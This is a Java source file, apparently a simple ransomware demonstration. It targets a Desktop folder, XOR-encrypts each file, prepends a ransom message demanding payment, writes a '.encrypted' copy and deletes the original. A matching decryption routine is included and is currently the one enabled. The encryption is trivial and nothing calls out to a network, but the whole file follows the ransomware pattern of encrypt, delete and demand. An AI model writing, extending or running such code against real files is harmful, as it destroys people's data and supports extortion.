
/* Encrypt and Decrypt files in a folder using encryptFile method and decryptFile method */

import java.io.*;

public class AppInitializer {

    private static String signature =
                    "------------------------------------------------------------------\n" +
                    "You bastard!, your files have been encrypted, you have to pay now!\n"
                    +"------------------------------------------------------------------\n";


    public static void main(String[] args) throws IOException {
        File targetDir = new File(new File(System.getProperty("user.home"), "Desktop"), "targetHere"); // 1

        File[] files = targetDir.listFiles();
        for (File file: files) {
            if(!file.isDirectory()){
                decryptFile(file); // call decrypt method
//                encryptFile(file); // call encrypt method
            }

        }
    }

    public static void decryptFile(File eFile) throws IOException {
        File decryptedFile = new File(eFile.getParent(), eFile.getName().replace(".encrypted", ""));

        if(!decryptedFile.exists()) {
            decryptedFile.createNewFile();

            FileInputStream fis = new FileInputStream(eFile);
            BufferedInputStream bis = new BufferedInputStream(fis);

            FileOutputStream fos = new FileOutputStream(decryptedFile);
            BufferedOutputStream bos = new BufferedOutputStream(fos);

            byte[] bytes = signature.getBytes();
            bis.read(bytes);

            while (true){
                byte[] buffer = new byte[1024 * 10];
                int read = bis.read(buffer);
                if(read == -1) break;
                for (int i = 0; i < read; i++) {
                    buffer[i] = (byte) (buffer[i] ^ 0B1111_1111); // Flip the byte cod
//                    buffer[i] = (byte) (buffer[i] - 1); // subtract a byte
                }
                bos.write(buffer, 0, read);
            }

            bos.close();
            bis.close();

            eFile.delete();
        }
    }


    public static void encryptFile(File eFile) throws IOException {
        File encryptedFile = new File(eFile.getParent(), eFile.getName() + ".encrypted");

        if(!encryptedFile.exists()) {
            encryptedFile.createNewFile();

            FileInputStream fis = new FileInputStream(eFile);
            BufferedInputStream bis = new BufferedInputStream(fis);

            FileOutputStream fos = new FileOutputStream(encryptedFile);
            BufferedOutputStream bos = new BufferedOutputStream(fos);

            byte[] bytes = signature.getBytes();
            bos.write(bytes);

            while (true) {
                byte[] buffer = new byte[1024 * 10];
                int read = bis.read(buffer);
                if (read == -1) break;
                for (int i = 0; i < read; i++) {
                    buffer[i] = (byte) (buffer[i] ^ 0B1111_1111); // Flip the byte cod
//                    buffer[i] = (byte) (buffer[i] + 1);
                }
                bos.write(buffer, 0, read);
            }

            bos.close();
            bis.close();

            eFile.delete();
        }
    }
}

